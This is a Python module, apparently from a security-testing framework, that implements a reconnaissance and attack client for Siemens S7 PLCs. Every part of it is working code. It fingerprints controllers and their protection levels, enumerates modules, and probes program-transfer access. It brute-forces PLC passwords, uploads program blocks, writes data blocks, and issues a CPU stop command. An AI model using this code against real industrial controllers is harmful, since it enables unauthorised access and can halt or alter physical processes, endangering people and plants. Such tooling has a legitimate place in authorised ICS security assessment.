#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Active S7comm / ISO-on-TCP client for Siemens PLC reconnaissance."""

from __future__ import annotations

import socket
import struct
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from lib.protocols.ics.siemens_defaults import S7_BLOCK_TYPE_CODES, S7_PROGRAM_TRANSFER_JOBS

try:
    import snap7  # type: ignore
    from snap7.client import Client as Snap7Client

    SNAP7_AVAILABLE = True
except ImportError:
    snap7 = None  # type: ignore
    Snap7Client = None  # type: ignore
    SNAP7_AVAILABLE = False


ISO_CR = bytes.fromhex("0300001611E00000000100C0010AC1020100C2020102")
S7_SETUP = bytes.fromhex("0300001902F08032010000040000080000F0000001000101E0")

PROTECTION_LABELS = {
    0: "unknown",
    1: "no protection (level 1)",
    2: "write protection (level 2)",
    3: "read/write protection (level 3)",
}


@dataclass
class S7Identity:
    host: str
    port: int
    connected: bool = False
    backend: str = "raw"
    cpu: str = ""
    module_type_name: str = ""
    serial_number: str = ""
    firmware: str = ""
    protection_level: int = 0
    protection_label: str = "unknown"
    modules: List[Dict[str, Any]] = field(default_factory=list)
    raw: Dict[str, Any] = field(default_factory=dict)
    error: str = ""


@dataclass
class S7ModuleInfo:
    index: int
    szl_id: int
    name: str = ""
    raw_hex: str = ""


@dataclass
class S7ProgramTransferProbe:
    host: str
    port: int
    job_type: int
    accepted: bool = False
    error_code: Optional[int] = None
    detail: str = ""
    backend: str = "raw"


@dataclass
class S7PasswordResult:
    host: str
    port: int
    password: str = ""
    success: bool = False
    attempts: int = 0
    protection_level: int = 0


class S7Client:
    def __init__(
        self,
        host: str,
        port: int = 102,
        timeout: float = 5.0,
        rack: int = 0,
        slot: int = 1,
        password: str = "",
    ):
        self.host = host
        self.port = int(port)
        self.timeout = float(timeout)
        self.rack = int(rack)
        self.slot = int(slot)
        self.password = password or ""
        self._sock: Optional[socket.socket] = None
        self._snap7: Any = None
        self._pdu_ref = 0
        self._backend = "raw"

    @property
    def connected(self) -> bool:
        if self._snap7 is not None:
            try:
                return bool(self._snap7.get_connected())
            except Exception:
                return False
        return self._sock is not None

    def connect(self) -> bool:
        if SNAP7_AVAILABLE:
            try:
                client = Snap7Client()
                client.set_connection_type(0x01)
                if self.password:
                    client.set_session_password(self.password)
                client.connect(self.host, self.rack, self.slot, self.port)
                self._snap7 = client
                self._backend = "snap7"
                return client.get_connected()
            except Exception:
                self._snap7 = None

        self.close()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        try:
            sock.connect((self.host, self.port))
        except OSError:
            sock.close()
            return False

        try:
            sock.sendall(ISO_CR)
            cc = self._recv(sock)
            if not cc or cc[5] != 0xD0:
                sock.close()
                return False
            sock.sendall(S7_SETUP)
            setup_resp = self._recv(sock)
            if not setup_resp or len(setup_resp) < 20 or setup_resp[17] != 0x32:
                sock.close()
                return False
        except OSError:
            sock.close()
            return False

        self._sock = sock
        self._backend = "raw"
        return True

    def close(self) -> None:
        if self._snap7 is not None:
            try:
                if self._snap7.get_connected():
                    self._snap7.disconnect()
            except Exception:
                pass
            try:
                self._snap7.destroy()
            except Exception:
                pass
            self._snap7 = None
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        self._sock = None

    def _recv(self, sock: Optional[socket.socket] = None) -> bytes:
        connection = sock or self._sock
        if not connection:
            return b""
        chunks: List[bytes] = []
        try:
            while True:
                part = connection.recv(4096)
                if not part:
                    break
                chunks.append(part)
                if len(part) < 4096:
                    break
        except socket.timeout:
            pass
        return b"".join(chunks)

    def _next_pdu_ref(self) -> int:
        self._pdu_ref = (self._pdu_ref + 1) & 0xFFFF
        return self._pdu_ref

    def _read_szl_raw(self, szl_id: int, szl_index: int = 0) -> bytes:
        if not self._sock:
            return b""
        pdu_ref = self._next_pdu_ref()
        param = bytes(
            [
                0x00,
                0x01,
                0x12,
                0x04,
                0x11,
                0x44,
                0x01,
                0x00,
                0xFF,
                0x09,
                0x00,
                0x04,
                (szl_id >> 8) & 0xFF,
                szl_id & 0xFF,
                (szl_index >> 8) & 0xFF,
                szl_index & 0xFF,
            ]
        )
        header = struct.pack(
            ">BBHHHHHH",
            0x32,
            0x07,
            pdu_ref,
            0x0000,
            len(param),
            0x0000,
            0x0000,
            0x0000,
        )
        payload = header + param
        tpkt = struct.pack(">BBH", 0x03, 0x00, len(payload) + 7) + b"\x02\xF0\x80" + payload
        self._sock.sendall(tpkt)
        return self._recv()

    def _send_raw_job(self, job_type: int, param_tail: bytes = b"") -> bytes:
        if not self._sock:
            return b""
        param = bytes([job_type & 0xFF, 0x00]) + param_tail
        pdu_ref = self._next_pdu_ref()
        header = struct.pack(">BBHHHHHH", 0x32, 0x01, pdu_ref, len(param), 0, 0, 0, 0)
        payload = header + param
        tpkt = struct.pack(">BBH", 0x03, 0x00, len(payload) + 7) + b"\x02\xF0\x80" + payload
        self._sock.sendall(tpkt)
        return self._recv()

    @staticmethod
    def _parse_s7_error(response: bytes) -> tuple[Optional[int], str]:
        if len(response) < 18 or response[17] != 0x32:
            return None, "invalid s7 response"
        rosctr = response[18]
        if rosctr == 0x03 and len(response) > 21:
            param_len = int.from_bytes(response[19:21], "big")
            data_offset = 21 + param_len
            if data_offset + 4 <= len(response):
                error_code = int.from_bytes(response[data_offset : data_offset + 2], "big")
                return error_code, "ack with error" if error_code else "ack"
            return 0, "ack"
        if rosctr == 0x02:
            return 0xFFFF, "user-data reject"
        return None, "unknown response"

    def enumerate_modules(self, max_index: int = 32) -> List[S7ModuleInfo]:
        modules: List[S7ModuleInfo] = []
        if self._backend == "snap7" and self._snap7 is not None:
            for index in range(max(0, max_index)):
                try:
                    result = self._snap7.read_szl(0x0013, index)
                    data = bytes(getattr(result, "Data", b"") or b"")
                    if not data.strip(b"\x00"):
                        continue
                    name = self._extract_ascii(data) or self._extract_ascii(data[4:40])
                    modules.append(
                        S7ModuleInfo(index=index, szl_id=0x0013, name=name, raw_hex=data[:64].hex())
                    )
                except Exception:
                    break
            return modules

        if not self._sock:
            return modules
        for index in range(max(0, max_index)):
            raw = self._read_szl_raw(0x0013, index)
            if not raw or len(raw) < 20:
                break
            name = self._extract_ascii(raw[20:60]) or self._extract_ascii(raw)
            if not name:
                break
            modules.append(
                S7ModuleInfo(index=index, szl_id=0x0013, name=name, raw_hex=raw[:64].hex())
            )
        return modules

    def probe_program_transfer(self, job_type: int = 0x1F) -> S7ProgramTransferProbe:
        probe = S7ProgramTransferProbe(
            host=self.host,
            port=self.port,
            job_type=job_type,
            backend=self._backend,
        )
        if self._backend == "snap7" and self._snap7 is not None:
            try:
                blocks = self._snap7.list_blocks()
                probe.accepted = bool(blocks)
                probe.detail = "list_blocks succeeded — program access appears available"
                return probe
            except Exception as exc:
                message = str(exc).lower()
                if "password" in message or "protection" in message or "access" in message:
                    probe.detail = "program access denied by protection"
                else:
                    probe.detail = str(exc)
                return probe

        if not self._sock:
            probe.detail = "not connected"
            return probe

        response = self._send_raw_job(job_type)
        error_code, detail = self._parse_s7_error(response)
        probe.error_code = error_code
        probe.detail = detail
        if error_code in (None, 0):
            probe.accepted = True
        elif error_code in (0xD601, 0xD602, 0xD603, 0xD604, 0xD681, 0xD682):
            probe.accepted = False
            probe.detail = f"access denied (0x{error_code:04X})"
        else:
            # Reached PLC logic but block/param invalid — channel still open.
            probe.accepted = True
            probe.detail = f"job reached PLC (0x{error_code:04X})"
        return probe

    def probe_program_transfer_jobs(self) -> List[S7ProgramTransferProbe]:
        return [self.probe_program_transfer(job) for job in S7_PROGRAM_TRANSFER_JOBS]

    def try_password(self, password: str) -> bool:
        saved = self.password
        self.close()
        self.password = password or ""
        if not self.connect():
            self.password = saved
            return False
        identity = self.identify()
        if identity.protection_level in (2, 3) and not password:
            return False
        return True

    def bruteforce_password(
        self,
        candidates: List[str],
        delay: float = 0.5,
    ) -> S7PasswordResult:
        import time

        result = S7PasswordResult(host=self.host, port=self.port)
        identity = self.identify()
        result.protection_level = identity.protection_level
        if identity.protection_level == 1:
            return result

        for attempt, candidate in enumerate(candidates, start=1):
            result.attempts = attempt
            if self.try_password(candidate):
                check = self.identify()
                if check.connected and check.protection_level >= 1:
                    result.success = True
                    result.password = candidate
                    return result
            if delay > 0:
                time.sleep(delay)
        return result

    def download_block(self, block_type: str, block_number: int) -> bytes:
        if not self.connected:
            raise RuntimeError("S7 client not connected")
        if self._backend != "snap7" or self._snap7 is None:
            raise RuntimeError("Block download requires python-snap7")
        code = S7_BLOCK_TYPE_CODES.get(str(block_type or "").upper())
        if code is None:
            raise ValueError(f"Unsupported block type: {block_type}")
        data = self._snap7.upload(code, int(block_number))
        return bytes(data)

    @staticmethod
    def _extract_ascii(data: bytes) -> str:
        text = "".join(chr(b) for b in data if 32 <= b < 127)
        return text.strip("\x00 ").strip()

    def _identity_snap7(self) -> S7Identity:
        identity = S7Identity(host=self.host, port=self.port, connected=True, backend="snap7")
        client = self._snap7
        try:
            cpu_info = client.get_cpu_info()
            identity.cpu = getattr(cpu_info, "ModuleTypeName", "") or ""
            identity.module_type_name = identity.cpu
            identity.serial_number = getattr(cpu_info, "SerialNumber", "") or ""
            identity.firmware = (
                f"V{getattr(cpu_info, 'Major', '')}.{getattr(cpu_info, 'Minor', '')}"
            ).strip(".")
        except Exception as exc:
            identity.error = str(exc)

        try:
            protection = client.get_protection()
            level = int(getattr(protection, "sch_schal", 0) or 0)
            identity.protection_level = level
            identity.protection_label = PROTECTION_LABELS.get(level, f"level {level}")
        except Exception as exc:
            if not identity.error:
                identity.error = str(exc)

        return identity

    def _identity_raw(self) -> S7Identity:
        identity = S7Identity(host=self.host, port=self.port, connected=True, backend="raw")
        module_data = self._read_szl_raw(0x001C, 0x0000)
        if module_data:
            identity.module_type_name = self._extract_ascii(module_data[40:80]) or self._extract_ascii(module_data)
            identity.cpu = identity.module_type_name
            identity.raw["szl_001c_hex"] = module_data.hex()

        protection_data = self._read_szl_raw(0x0232, 0x0004)
        if protection_data:
            for offset in range(len(protection_data) - 1, max(0, len(protection_data) - 32), -1):
                byte = protection_data[offset]
                if byte in PROTECTION_LABELS:
                    identity.protection_level = byte
                    identity.protection_label = PROTECTION_LABELS[byte]
                    break
            identity.raw["szl_0232_hex"] = protection_data.hex()

        order_data = self._read_szl_raw(0x0011, 0x0000)
        if order_data:
            identity.serial_number = self._extract_ascii(order_data[20:36])
            identity.raw["szl_0011_hex"] = order_data.hex()

        return identity

    def identify(self) -> S7Identity:
        if self._backend == "snap7" and self._snap7 is not None:
            return self._identity_snap7()
        if self._sock:
            return self._identity_raw()
        return S7Identity(
            host=self.host,
            port=self.port,
            connected=False,
            error="not connected",
        )

    def get_protection_level(self) -> Dict[str, Any]:
        identity = self.identify()
        return {
            "host": identity.host,
            "port": identity.port,
            "connected": identity.connected,
            "protection_level": identity.protection_level,
            "protection_label": identity.protection_label,
            "module_type_name": identity.module_type_name,
            "backend": identity.backend,
            "error": identity.error,
        }

    def read_db(self, db_number: int, start: int, size: int) -> bytes:
        if not self.connected:
            raise RuntimeError("S7 client not connected")
        if self._backend == "snap7" and self._snap7 is not None:
            return bytes(self._snap7.db_read(int(db_number), int(start), int(size)))
        raise RuntimeError("DB read requires python-snap7 (raw ISO-on-TCP backend is identify-only)")

    def write_db(self, db_number: int, start: int, data: bytes) -> None:
        if not self.connected:
            raise RuntimeError("S7 client not connected")
        if self._backend == "snap7" and self._snap7 is not None:
            self._snap7.db_write(int(db_number), int(start), bytearray(data))
            return
        raise RuntimeError("DB write requires python-snap7 (raw ISO-on-TCP backend is identify-only)")

    def cpu_stop(self) -> bool:
        if not self.connected:
            raise RuntimeError("S7 client not connected")
        if self._backend == "snap7" and self._snap7 is not None:
            return bool(self._snap7.plc_stop())
        raise RuntimeError("CPU stop requires python-snap7 (raw ISO-on-TCP backend is identify-only)")


def identify_s7_device(
    host: str,
    port: int = 102,
    timeout: float = 5.0,
    rack: int = 0,
    slot: int = 1,
    password: str = "",
) -> S7Identity:
    client = S7Client(host, port, timeout, rack, slot, password)
    if not client.connect():
        return S7Identity(host=host, port=port, connected=False, error="connection failed")
    try:
        return client.identify()
    finally:
        client.close()


def snap7_available() -> bool:
    return SNAP7_AVAILABLE


def enumerate_s7_modules(
    host: str,
    port: int = 102,
    timeout: float = 5.0,
    rack: int = 0,
    slot: int = 1,
    password: str = "",
    max_index: int = 32,
) -> List[S7ModuleInfo]:
    client = S7Client(host, port, timeout, rack, slot, password)
    if not client.connect():
        return []
    try:
        return client.enumerate_modules(max_index)
    finally:
        client.close()


def bruteforce_s7_password(
    host: str,
    candidates: List[str],
    port: int = 102,
    timeout: float = 5.0,
    rack: int = 0,
    slot: int = 1,
    delay: float = 0.5,
) -> S7PasswordResult:
    client = S7Client(host, port, timeout, rack, slot, "")
    if not client.connect():
        return S7PasswordResult(host=host, port=port)
    try:
        return client.bruteforce_password(candidates, delay)
    finally:
        client.close()


def probe_s7_program_transfer(
    host: str,
    port: int = 102,
    timeout: float = 5.0,
    rack: int = 0,
    slot: int = 1,
    password: str = "",
) -> List[S7ProgramTransferProbe]:
    client = S7Client(host, port, timeout, rack, slot, password)
    if not client.connect():
        return []
    try:
        return client.probe_program_transfer_jobs()
    finally:
        client.close()
